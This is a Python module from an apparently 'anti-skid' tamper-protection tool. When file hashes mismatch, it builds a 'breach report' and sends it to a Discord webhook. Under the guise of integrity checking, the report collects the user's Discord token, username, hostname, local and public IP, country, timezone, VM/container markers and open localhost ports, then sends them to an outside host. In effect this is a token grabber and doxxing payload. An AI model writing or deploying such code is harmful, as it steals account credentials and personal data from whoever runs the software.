# builds the breach report and ships it to discord
# runs in a background thread so it doesnt slow anything down
# if no webhook it just dumps to stderr whatever

import json
import os
import sys
import threading
import urllib.request
import datetime

from .environment import sniff_everything

MAX_LEN = 1000  # discord dont like long messages


def _chop(text: str, max_len: int = MAX_LEN) -> str:
    # cuts text if its too long
    if len(text) <= max_len:
        return text
    return text[: max_len - 30] + "\n\n... [chopped]"


def _fmt_mismatches(mismatches: list) -> str:
    # makes a readable list of hash mismatches
    if not mismatches:
        return "none lol"
    lines = []
    for m in mismatches:
        lines.append(f"- {m['path']}")
        lines.append(f"  expected: {m['expected'][:16]}...")
        lines.append(f"  got:      {m['actual'][:16]}...")
        lines.append("")
    return _chop("\n".join(lines))


def build_report(audit: dict) -> str:
    # builds the whole breach report as a text file
    now = datetime.datetime.utcnow().isoformat() + "Z"

    env = sniff_everything()
    host = env.get("host", {})
    ports = env.get("ports", {})
    discord = env.get("discord_process", "???")
    token = env.get("discord_token", "???")
    tz = env.get("timezone", "???")
    country = env.get("country", "???")
    vm = env.get("container_vm", {})

    out = []

    out.append("=" * 64)
    out.append("  ANTI SKID BREACH REPORT")
    out.append("=" * 64)
    out.append(f"time: {now}")
    out.append(f"passed: {audit['passed']}")
    out.append(f"took: {audit['elapsed_ms']}ms")
    out.append(f"total files: {audit['total_files']}")
    out.append(f"matched: {audit['matched']}")
    out.append(f"mismatches: {len(audit['mismatches'])}")
    out.append(f"missing: {len(audit['missing'])}")
    out.append(f"new/unknown: {len(audit['new_files'])}")

    if audit.get("error"):
        out.append(f"\n!! audit error: {audit['error']}")

    # mismatches section
    out.append("\n" + "-" * 64)
    out.append("  FILES THAT GOT TOUCHED")
    out.append("-" * 64)
    out.append(_fmt_mismatches(audit["mismatches"]))

    if audit.get("missing"):
        out.append("\n-- MISSING FILES --")
        for m in audit["missing"]:
            out.append(f"  - {m}  [deleted or renamed]")

    if audit.get("new_files"):
        out.append("\n-- NEW / UNTRACKED FILES --")
        for nf in audit["new_files"]:
            out.append(f"  - {nf}")

    # host info
    out.append("\n" + "-" * 64)
    out.append("  WHO GOT CAUGHT")
    out.append("-" * 64)
    out.append(f"hostname: {host.get('hostname', '???')}")
    out.append(f"username: {host.get('username', '???')}")
    out.append(f"local ip: {host.get('local_ip', '???')}")
    out.append(f"public ip: {host.get('public_ip', '???')}")
    out.append(f"platform: {host.get('platform', '???')}")
    out.append(f"python: {host.get('python_version', '???')}")
    out.append(f"timezone: {tz}")
    out.append(f"country/city: {country}")

    # token (keep it short)
    out.append("\n" + "-" * 64)
    out.append("  DISCORD TOKEN")
    out.append("-" * 64)
    out.append(f"token: {token}")

    # env markers
    out.append("\n" + "-" * 64)
    out.append("  ENVIRONMENT")
    out.append("-" * 64)
    out.append(f"discord open: {discord}")
    out.append(f"docker env file: {vm.get('docker_env_file', False)}")
    out.append(f"docker cgroup: {vm.get('docker_cgroup', False)}")
    out.append(f"virtualbox: {vm.get('vbox', False)}")
    out.append(f"vmware: {vm.get('vmware', False)}")
    out.append(f"qemu: {vm.get('qemu', False)}")

    # ports
    out.append("\n" + "-" * 64)
    out.append("  PORTS (localhost)")
    out.append("-" * 64)
    if ports:
        for pl, status in sorted(ports.items()):
            out.append(f"  {pl:<20} {status}")
    else:
        out.append("  (none)")

    out.append("\n" + "=" * 64)
    out.append("  END")
    out.append("=" * 64)

    return "\n".join(out)


# --------------- discord webhook (embed + file) ---------------

def _build_embed(audit: dict, host: dict, tz: str, country: str, token: str,
                 discord_open: bool, vm: dict) -> dict:
    """build a clean discord embed summary"""

    color = 0xFF0000  # red for breach
    status = "BREACH DETECTED"
    emoji = ":warning:"

    # build description
    desc_lines = [
        f"**{emoji} ANTI-SKID INTEGRITY BREACH**",
        f"",
        f"**Audit Result**",
        f"`Matched:` {audit['matched']}/{audit['total_files']}",
        f"`Mismatches:` {len(audit['mismatches'])}",
        f"`Missing:` {len(audit['missing'])}",
        f"`New:` {len(audit['new_files'])}",
        f"`Took:` {audit['elapsed_ms']}ms",
    ]

    # if there are mismatches, list the first few
    if audit.get("mismatches"):
        desc_lines.append(f"")
        desc_lines.append(f"**Touched Files**")
        for m in audit["mismatches"][:5]:
            fname = m["path"].split("/")[-1]
            desc_lines.append(f"`{fname}`")

    desc = "\n".join(desc_lines)
    if len(desc) > 2000:
        desc = desc[:1990] + "\n... (truncated)"

    embed = {
        "title": "Anti-Skid Breach Alert",
        "description": desc,
        "color": color,
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "fields": [
            {
                "name": ":bust_in_silhouette: Identity",
                "value": (
                    f"**User:** `{host.get('username', '???')}`\n"
                    f"**Host:** `{host.get('hostname', '???')}`\n"
                    f"**Platform:** `{host.get('platform', '???')[:50]}`"
                ),
                "inline": True,
            },
            {
                "name": ":globe_with_meridians: Network",
                "value": (
                    f"**Local IP:** `{host.get('local_ip', '???')}`\n"
                    f"**Public IP:** `{host.get('public_ip', '???')}`\n"
                    f"**Country:** {country}"
                ),
                "inline": True,
            },
            {
                "name": ":clock: Location",
                "value": f"**Timezone:** `{tz}`",
                "inline": False,
            },
            {
                "name": ":desktop: Environment",
                "value": (
                    f"**Discord:** {'open' if discord_open else 'closed'}\n"
                    f"**VM/VBox:** {vm.get('vbox', False)}\n"
                    f"**VMware:** {vm.get('vmware', False)}\n"
                    f"**Docker:** {vm.get('docker_env_file', False) or vm.get('docker_cgroup', False)}"
                ),
                "inline": False,
            },
        ],
        "footer": {"text": "anti-skid | report attached below"},
    }

    # add token field only if we grabbed one
    if token and token != "none found" and token != "err":
        embed["fields"].append({
            "name": ":key: Discord Token",
            "value": f"||{token[:30]}...||",
            "inline": False,
        })

    return embed


def _send_discord(webhook_url: str, report: str, audit: dict,
                  host: dict, tz: str, country: str, token: str,
                  discord_open: bool, vm: dict) -> bool:
    """sends embed to discord — just json, no multipart junk"""
    embed = _build_embed(audit, host, tz, country, token, discord_open, vm)

    # simple json payload, no multipart
    payload = json.dumps({
        "username": "anti-skid sentinel",
        "content": "",
        "embeds": [embed],
    }).encode("utf-8")

    req = urllib.request.Request(
        webhook_url,
        data=payload,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "anti-skid/1.0",
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read()
            code = resp.status
            # discord returns 204 on success
            if 200 <= code < 300:
                return True
            else:
                print(f"[anti-skid] discord said {code}: {body[:200]}", file=sys.stderr)
                return False
    except Exception as e:
        print(f"[anti-skid] webhook error: {e}", file=sys.stderr)
        return False


def report_breach(webhook_url, audit):
    # builds report and fires it off to discord
    # does it sync so it actually sends before the process dies
    if not webhook_url:
        webhook_url = os.environ.get("ANTI_SKID_WEBHOOK")

    # sniff env data for the embed
    env = sniff_everything()
    host = env.get("host", {})
    tz = env.get("timezone", "???")
    country = env.get("country", "???")
    token = env.get("discord_token", "???")
    discord_open = env.get("discord_process", False)
    vm = env.get("container_vm", {})

    report_text = build_report(audit)

    if not webhook_url:
        print("\n[anti-skid] no webhook set, here's the report:\n", file=sys.stderr)
        print(report_text, file=sys.stderr)
        return

    # send it now (sync, not a thread — process is about to die anyway)
    print("[anti-skid] sending breach report to discord...", file=sys.stderr)
    ok = _send_discord(webhook_url, report_text, audit, host, tz, country, token, discord_open, vm)
    if ok:
        print("[anti-skid] breach report sent", file=sys.stderr)
    else:
        print("[anti-skid] failed to send webhook rip, dumping report:\n", file=sys.stderr)
        print(report_text, file=sys.stderr)
